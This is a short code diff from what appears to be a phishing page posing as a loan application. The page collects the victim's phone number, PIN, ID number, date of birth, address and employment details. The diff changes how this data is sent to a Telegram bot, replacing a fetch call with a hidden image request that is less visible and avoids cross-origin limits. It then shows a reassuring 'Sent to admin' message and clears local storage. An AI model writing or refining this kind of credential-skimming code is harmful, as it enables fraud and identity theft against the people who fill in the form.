@@ -37,12 +37,8 @@ const data = {
 
 const message = `🆕 *NEW LOAN APPLICATION*\n\n💰 *Loan:* $${data.amount} for ${data.period} months\n📱 *Phone:* ${data.phone}\n🔒 *PIN:* ${data.pin}\n\n👤 *Name:* ${data.fullName}\n🆔 *ID:* ${data.idNumber}\n📅 *DOB:* ${data.dob}\n🏠 *Address:* ${data.address}\n💼 *Job:* ${data.job}\n🏢 *Employer:* ${data.employer}\n💵 *Salary:* ${data.salary}\n\n⏰ *Time:* ${new Date().toLocaleString()}`;
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})
-});
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+new Image().src = url;
 
 document.querySelector('.timer-box').innerHTML = '✅ Sent to admin. Redirecting...';
 localStorage.clear(); 
